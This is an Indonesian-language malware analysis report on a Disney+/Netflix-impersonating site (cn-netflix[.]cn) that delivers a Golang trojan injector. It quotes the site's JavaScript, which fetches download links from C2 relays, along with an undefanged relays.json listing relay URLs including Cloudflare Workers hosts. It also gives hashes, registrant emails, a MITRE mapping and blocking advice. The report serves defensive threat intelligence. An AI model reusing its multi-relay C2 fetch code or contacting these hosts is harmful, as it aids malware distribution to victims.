# Analisis Kampanye Drive-By Malware Delivery: Impersonasi Brand Disney/Netflix (cn-netflix[.]cn)
 
**Klasifikasi:** TLP:CLEAR (Research Purpose Only)
**Penulis:** (dearAngles303)
**Tanggal:** 13 Agustus 2026
**Disclaimer:** Analisis ini dilakukan murni untuk tujuan riset dan edukasi keamanan siber di lingkungan laboratorium terisolasi. Tidak ada data pribadi atau sistem produksi yang diekspos dalam proses analisis ini.
 
---
 
## 1. Executive Summary
 
Investigasi ini membedah kampanye *Malware Delivery* berbasis web yang memanfaatkan teknik penipuan visual (*brand impersonation*) gabungan antara merek Netflix dan Disney+. Berbeda dengan situs *credential harvesting* konvensional yang mengumpulkan password melalui formulir HTML, situs ini berfungsi sebagai vektor distribusi berkas berbahaya (*Drive-by Download*).
 
Situs utama menggunakan pemanggilan API asinkron (*JavaScript Fetch*) ke server *staging/C2* eksternal untuk menarik tautan unduhan secara dinamis. Analisis lebih lanjut pada arsitektur backend mengungkap **skema C2 multi-relay dengan retry logic** — situs tidak bergantung pada satu server C2 tunggal, melainkan sebuah daftar (`relays.json`) berisi tiga endpoint cadangan, dua di antaranya di-hosting di infrastruktur **Cloudflare Workers** untuk meningkatkan resiliensi terhadap takedown.
 
Berkas payload berupa arsip `.zip` berisi biner *executable* bertipe Golang (`install_sint007.exe`). Pemindaian awal pada level arsip sempat mengindikasikan status *clean*, namun pembedahan biner secara independen mengonfirmasi bahwa sampel ini merupakan *Trojan Injector* yang terdeteksi oleh 9 vendor Anti-Virus utama. Data WHOIS pada dua domain yang teridentifikasi dalam rantai infeksi (landing page dan relay server) menunjukkan identitas registrant yang berbeda, mengindikasikan kemungkinan model **infrastruktur berlapis (layered infrastructure)** yang umum pada operasi *Phishing-as-a-Service*.
 
---
 
## 2. Background & Motivasi
 
Penyebaran *Infostealer* dan *Trojan* melalui situs impersonasi media populer (seperti platform streaming dan perangkat lunak komersial) terus meningkat. Penelitian ini bertujuan membedah arsitektur pengiriman muatan berbahaya, memisahkan lapisan *frontend* (umpan visual) dengan *backend* (C2), menganalisis mekanisme resiliensi infrastruktur C2, serta menganalisis artefak biner yang didistribusikan hingga mengonfirmasi ancaman teknisnya.
 
---
 
## 3. Metodologi
 
| Komponen | Detail |
|---|---|
| **Environment** | Isolated VM (Kali Linux via VirtualBox, Network NAT Mode) |
| **Tools Statis CLI** | `curl`, `whois`, `dig`, `host`, `grep`, `strings`, `file` |
| **Tools OSINT & Sandbox** | VirusTotal, Hybrid Analysis, MetaDefender/OPSWAT, crt.sh |
| **Prinsip Keamanan** | Ekstraksi kode dan pembedahan biner dilakukan tanpa mengeksekusi payload di sistem host |
 
---
 
## 4. Timeline Investigasi
 
| Waktu | Aktivitas |
|---|---|
| 24 Juli 2026 | Domain `cn-netflix[.]cn` didaftarkan (Registrar: Beijing Xinwang) |
| 10 Agustus 2026 | Domain `noah-ssh[.]com.cn` didaftarkan (Registrar: Web Commerce Communications Limited) — teridentifikasi belakangan sebagai bagian dari relay pool |
| 13 Agustus 2026 | Sampel ditemukan via Phishunt.io; pengumpulan data OSINT domain dan ekstraksi kode HTML/JS mentah |
| 13 Agustus 2026 | Analisis fungsi `fetch()` dan identifikasi server C2 awal (`noah-sk[.]com`) |
| 13 Agustus 2026 | Ekstraksi `relays.json`, ditemukan skema multi-relay dengan 3 endpoint C2 |
| 13 Agustus 2026 | Pengunduhan arsip `install_sint007.zip` dan pembedahan biner `install_sint007.exe` |
| 13 Agustus 2026 | Verifikasi deteksi Trojan pada OPSWAT MetaDefender (9/26 Detections) |
| 13 Agustus 2026 | Verifikasi WHOIS + crt.sh untuk `noah-ssh[.]com.cn`, ditemukan registrant berbeda dari domain landing page |
 
---
 
## 5. Technical Analysis
 
### 5.1 Infrastructure & OSINT Reconnaissance — Landing Page
 
* **Domain Target:** `cn-netflix[.]cn`
* **Tanggal Registrasi:** 24 Juli 2026 (*Newly Registered Domain* / NRD).
* **Registrant Contact:** `alirezajobe171[at]gmail.com`
* **Registrar:** Beijing Xinwang Digital Information Technology Co., Ltd.
* **Resolusi Alamat IP:** `154.19.248.17`
* **Name Server:** `ns1.363.hk` & `ns2.363.hk` (Hong Kong)
### 5.2 Infrastructure & OSINT Reconnaissance — Relay Server
 
Salah satu domain di dalam `relays.json` (lihat 5.4) turut dianalisis secara terpisah:
 
* **Domain:** `noah-ssh[.]com.cn`
* **Tanggal Registrasi:** 10 Agustus 2026 — **hanya 3 hari sebelum sampel ditemukan**, indikator NRD yang jauh lebih signifikan dibanding domain landing page.
* **Registrant Contact:** 乔蓉蓉 / `3877098865@qq.com`
* **Registrar:** Web Commerce Communications Limited
* **Name Server:** `a9.share-dns.com` & `b9.share-dns.com`
* **Sertifikat (crt.sh):** 2 sertifikat Let's Encrypt, keduanya *issued* 2026-08-10 (bertepatan dengan tanggal registrasi) — tidak ditemukan histori sertifikat lama pada domain ini.
**Catatan Attribution:** Registrant dan registrar pada domain relay **berbeda sepenuhnya** dari domain landing page. Kedua domain hanya terhubung secara fungsional melalui kode JavaScript, bukan melalui data registrasi. Pola ini konsisten dengan model infrastruktur berlapis, di mana operator relay/C2 kemungkinan beroperasi independen dari operator yang men-deploy landing page individual — sebuah karakteristik umum pada operasi *Phishing-as-a-Service*, dan sekaligus strategi yang mempersulit *attribution* satu-ke-satu.
 
### 5.3 UI/UX Deception Analysis (Human Layer)
Secara visual, antarmuka situs menggunakan tema gelap dengan logo gabungan *Disney + 流媒体影视*. Terdapat ketidakcocokan (*mismatch*) struktural antara nama domain (`cn-netflix`) dengan konten UI yang didominasi teks dan logo Disney+. Hal ini mengindikasikan penggunaan *Phishing Kit/Template* massal oleh penyerang tanpa melakukan penyesuaian variabel footer secara menyeluruh.
 
### 5.4 Background API Request & Multi-Relay C2 Architecture (Code Layer)
 
Pemeriksaan kode HTML/JS menggunakan utilitas `grep` mengonfirmasi bahwa situs **tidak menggunakan formulir input login konvensional (`POST`)**. Situs mengeksekusi skrip JavaScript asinkron untuk menarik tautan unduhan dari infrastruktur terpisah di belakang layar:
 
```javascript
// Panggilan awal
fetch('https://noah-sk[.]com/api.php')
  .then(function(r){ return r.json() })
  .then(function(d){
      if(d && d.code === 0 && d.download_link) bind(d.download_link)
  })
  .catch(function(){});
```
 
Analisis lebih dalam mengungkap bahwa panggilan di atas hanyalah satu titik dari skema **retry/failover multi-endpoint**. Situs terlebih dahulu menarik daftar server cadangan dari `noah-ssh[.]com.cn/relays.json`:
 
```json
{
  "data": {
    "v": 1786523551,
    "updated_at": 1786523551,
    "relays": [
      "https://noah-ssh.com.cn",
      "https://noah-relay.wotudj578.workers.dev",
      "https://noah-relay2.wotudj578.workers.dev"
    ]
  }
}
```
 
Daftar ini kemudian dikonsumsi oleh fungsi rekursif berikut:
 
```javascript
function fetchLink(relays, i, done) {
  if (!relays || i > relays.length) { if (done) done(); return; }
  fetch(relays[i].replace(/\/+$/, '') + '/api.php?t=' + Date.now(), { signal: ctrl.signal, cache: 'no-store' })
    .then(function (r) { return r.ok ? r.json() : Promise.reject(); })
    .catch(function () { fetchLink(relays, i + 1, done); });
}
```
 
**Interpretasi Teknis:** Fungsi ini mencoba `relays[0]`; jika request gagal (`.catch`), secara otomatis mencoba `relays[i+1]` hingga salah satu endpoint merespons atau daftar habis. Hasil `relays.json` turut disimpan ke `localStorage` browser korban (dengan key `POOL_KEY`) sebagai mekanisme caching, sehingga permintaan berikutnya tidak perlu fetch ulang.
 
**Temuan Signifikan — Abuse of Cloudflare Workers:** Dua dari tiga endpoint relay (`noah-relay.wotudj578.workers.dev` dan `noah-relay2.wotudj578.workers.dev`) di-hosting pada domain **`workers.dev`**, subdomain gratis milik Cloudflare Workers. Pola ini memberikan keuntungan operasional signifikan bagi *threat actor*:
- Sertifikat HTTPS valid otomatis tanpa biaya tambahan
- Traffic menyatu dengan lalu lintas Cloudflare yang sah, mempersulit deteksi berbasis reputasi domain
- Endpoint baru dapat di-deploy dalam hitungan detik tanpa proses registrasi domain, jika satu endpoint di-takedown
### 5.5 Malware Analysis: `install_sint007.exe`
 
Berdasarkan hasil analisis statis pada level biner, sampel ini menunjukkan indikator aktivitas berbahaya:
 
* **Klasifikasi:** Biner *executable* hasil kompilasi dengan **Golang**.
* **Indikator Teknis:** Signature deteksi vendor AV (lihat 5.6) mengindikasikan kapabilitas **process injection**, bertujuan menyisipkan kode ke proses sistem yang sah untuk menghindari deteksi dan mempertahankan persistensi. Proses target spesifik belum diverifikasi dalam analisis statis ini.
* **SHA256 Hash Biner (exe):** `f7183fd3ffcfb291a1d92dec3e551b89eb0601ad5d574550bf86324161abd3af`
* **Hasil Deteksi AV (OPSWAT MetaDefender):** 9/26 Vendor Detections (MALICIOUS)
### 5.6 Hasil Deteksi Vendor Utama
- Bitdefender & Emsisoft: `Gen:Variant.Yogi.48158`
- Huorong: `HVM:Trojan/Injector.dn` (indikasi kapabilitas process injection)
- Avira & Vir.IT: `TR/W64.Agent` / `Trojan.Win64.Agent.KBX`
- AhnLab: `Trojan/Win.Generic`
---
 
## 6. MITRE ATT&CK Mapping
 
| Tactic | Technique ID | Technique Name | Observasi di Sampel |
| :--- | :--- | :--- | :--- |
| Resource Development | T1583.001 | Acquire Infrastructure: Domains | Registrasi domain NRD `cn-netflix[.]cn` dan `noah-ssh[.]com.cn` |
| Resource Development | T1583.006 | Acquire Infrastructure: Web Services | Abuse Cloudflare Workers (`workers.dev`) sebagai endpoint relay C2 |
| Defense Evasion | T1036.005 | Masquerading | Meniru identitas visual Disney+/Netflix pada landing page |
| Execution | T1204.002 | User Execution: Malicious File | Membujuk pengguna mengunduh dan mengekstrak berkas `.zip` |
| Defense Evasion | T1027 | Obfuscated Files or Information | Penggunaan kompresi `.zip` dan biner Golang untuk mengelabui static scanner |
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Komunikasi C2 via HTTPS Fetch |
| Command and Control | T1008 | Fallback Channels | Skema retry multi-relay (`relays.json`) dengan 3 endpoint cadangan |
| Defense Evasion | T1055 | Process Injection | Terindikasi dari signature AV (Huorong: Injector.dn) |
 
---
 
## 7. Indicators of Compromise (IOCs)
 
| Tipe | Nilai | Keterangan |
|---|---|---|
| Domain | `cn-netflix[.]cn` | Phishing landing page |
| IP Address | `154.19.248.17` | IP hosting landing page |
| Domain | `noah-sk[.]com` | C2 endpoint awal (API download link) |
| Domain | `noah-ssh[.]com.cn` | Relay server (host `relays.json`), juga `relays[0]` |
| Domain | `noah-relay.wotudj578.workers.dev` | Relay cadangan (`relays[1]`), Cloudflare Workers |
| Domain | `noah-relay2.wotudj578.workers.dev` | Relay cadangan (`relays[2]`), Cloudflare Workers |
| Email | `alirezajobe171@gmail.com` | Registrant `cn-netflix.cn` |
| Email | `3877098865@qq.com` | Registrant `noah-ssh.com.cn` |
| SHA256 (zip) | `1929f509a3c29e8dfb0ebb10d5b89085c1bca863980364e79f635b9a3c68cacb` | Hash `install_sint007.zip` |
| SHA256 (exe) | `f7183fd3ffcfb291a1d92dec3e551b89eb0601ad5d574550bf86324161abd3af` | Hash `install_sint007.exe` |
 
---
 
## 8. Conclusion
 
Kampanye ini menunjukkan evolusi taktik *threat actor* yang bergeser dari pencurian kredensial massal menjadi distribusi trojan multi-tahap dengan infrastruktur C2 yang dirancang untuk resiliensi. Penggunaan domain baru yang didaftarkan dalam hitungan hari, kombinasi *registrant* berbeda antar lapisan infrastruktur, serta pemanfaatan layanan cloud legitimate (Cloudflare Workers) sebagai relay cadangan, membuktikan bahwa aktor di balik kampanye ini mengedepankan otomatisasi dan ketahanan operasional — bukan sekadar *phishing kit* statis satu-server. Analisis teknis terhadap biner `install_sint007.exe` mengonfirmasi bahwa insiden ini merupakan ancaman aktif yang mengeksploitasi kepercayaan pengguna terhadap platform hiburan populer untuk tujuan *persistent access* dan injeksi proses di sistem Windows.
 
---
 
## 9. Recommendations
 
1. **Edukasi Pengguna:** Wajib mengingatkan pengguna akhir agar tidak mengunduh atau menjalankan berkas eksekusi dari sumber yang tidak terverifikasi, meskipun kemasan visualnya terlihat meyakinkan.
2. **Pemantauan NRD:** Implementasikan kebijakan *threat intelligence* untuk memantau domain yang baru terdaftar (*Newly Registered Domains*) yang menggunakan nama merek besar.
3. **Filtering Jaringan:** Blokir akses keluar ke seluruh domain dan IP pada tabel IOC di atas — termasuk kedua subdomain `workers.dev`, karena keduanya berfungsi sebagai fallback C2 aktif.
4. **Deteksi Berbasis Perilaku, Bukan Hanya Domain:** Karena kampanye ini terbukti mampu berpindah endpoint C2 secara otomatis (fallback multi-relay), pemblokiran satu domain saja tidak cukup — disarankan monitoring pola network request beruntun ke banyak domain berbeda dalam waktu singkat sebagai indikator perilaku (behavioral IOC).
5. **Audit Keamanan Aplikasi:** Untuk entitas korporat, pastikan kebijakan Zero Trust diterapkan dan lakukan verifikasi integritas berkas sebelum dieksekusi pada perangkat kerja.
---
 
## 10. Batasan Analisis (Limitations)
 
- Analisis biner terbatas pada static analysis (`strings`) dan hasil sandbox pihak ketiga (Hybrid Analysis); belum dilakukan dynamic/behavioral analysis independen (monitoring registry, proses, dan network secara langsung dalam sandbox milik peneliti).
- Proses target spesifik dari kapabilitas *process injection* belum terverifikasi.
- Status aktif/tidaknya kedua endpoint `workers.dev` pada saat publikasi perlu diverifikasi ulang, mengingat sifatnya yang dapat di-deploy/dicabut dengan cepat.
 